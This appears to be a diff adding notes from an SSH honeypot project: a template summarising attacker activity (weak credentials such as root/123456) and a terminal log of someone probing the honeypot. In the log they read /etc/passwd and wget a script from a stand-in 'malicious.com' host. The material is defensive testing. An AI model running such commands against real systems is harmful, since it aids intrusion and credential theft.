@@ -1,0 +1,85 @@
+Total connections: X
+Unique IPs: X
+
+Sample attacker IPs:
+- 49.42.178.99
+
+Common usernames:
+- root
+- admin
+
+Common passwords:
+- 123456
+- password
+
+Commands used:
+- uname -a
+- wget http://...
+- cat /etc/passwd
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+┌──(igris㉿kali)-[~]
+└─$ ssh root@3.109.49.117 -p 2222              
+The authenticity of host '[3.109.49.117]:2222 ([3.109.49.117]:2222)' can't be established.
+ED25519 key fingerprint is: SHA256:i7qPiKFbDE0jwoCvNUheDRq737zUSVR5rPHjVch7jLU
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[3.109.49.117]:2222' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+root@3.109.49.117's password: 
+Permission denied, please try again.
+root@3.109.49.117's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@svr04:~# ls 
+root@svr04:~# pwd 
+/root
+root@svr04:~# whoami 
+root
+root@svr04:~# cat /etc/passwd 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+phil:x:1000:1000:Phil California,,,:/home/phil:/bin/bash
+root@svr04:~# uname -a 
+Linux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+root@svr04:~# wget http://malicious.com/file.sh 
+--2026-03-24 18:13:29--  http://malicious.com/file.sh
+Connecting to malicious.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9266 (9.048828125K) [text/html]
+Saving to: `/root/file.sh'
+
+100% [======================================>] 9,266        377.3K/ss  eta 0s
+
+2026-03-24 18:13:31 (377.25 KB/s) - `/root/file.sh' saved [9266/9266]
+
+root@svr04:~# curl http://test.com 
+curl: (6) Could not resolve host: test.com
+root@svr04:~# Read from remote host 3.109.49.117: Connection reset by peer 
+Connection to 3.109.49.117 closed. 
+client_loop: send disconnect: Broken pipe
